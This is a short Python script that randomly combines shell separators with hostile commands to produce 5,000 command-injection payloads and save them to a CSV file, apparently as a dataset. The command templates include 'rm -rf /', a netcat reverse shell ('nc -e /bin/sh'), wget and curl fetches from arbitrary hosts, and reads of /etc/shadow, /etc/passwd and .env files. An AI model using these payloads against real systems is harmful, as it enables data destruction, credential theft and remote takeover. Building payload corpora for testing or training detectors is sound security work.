import pandas as pd
import random
import string
import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TARGET = 5000

def rand_str(n=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def gen_unique_cmd_injection():
    operators = [";", "|", "&", "&&", "||", "`", "$( )"]
    commands = [
        "ls", "cat", "whoami", "id", "uname -a", "pwd", "rm -rf /", 
        "wget http://{}", "curl http://{}", "ping -c 4 {}", "netstat",
        "ps aux", "env", "nmap", "nc -e /bin/sh {} {}"
    ]
    files = ["/etc/passwd", "/etc/shadow", "config.php", ".env", "/var/log/syslog"]
    
    op = random.choice(operators)
    cmd = random.choice(commands)
    
    if "{}" in cmd:
        num_placeholders = cmd.count("{}")
        payload = cmd.format(*[rand_str() for _ in range(num_placeholders)])
    else:
        payload = f"{cmd} {random.choice(files)}"
    
    if op == "$( )":
        return f"$({payload})"
    return f"{op} {payload}"

def generate_unique(generator):
    s = set()
    while len(s) < TARGET:
        s.add(generator())
    return list(s)

if __name__ == "__main__":
    payloads = generate_unique(gen_unique_cmd_injection)
    df = pd.DataFrame({"payload": payloads})
    output_path = os.path.join(BASE_DIR, "command_injection.csv")
    df.to_csv(output_path, index=False)
    print(f"DONE: Generated {TARGET} unique Command Injection payloads at {output_path}")
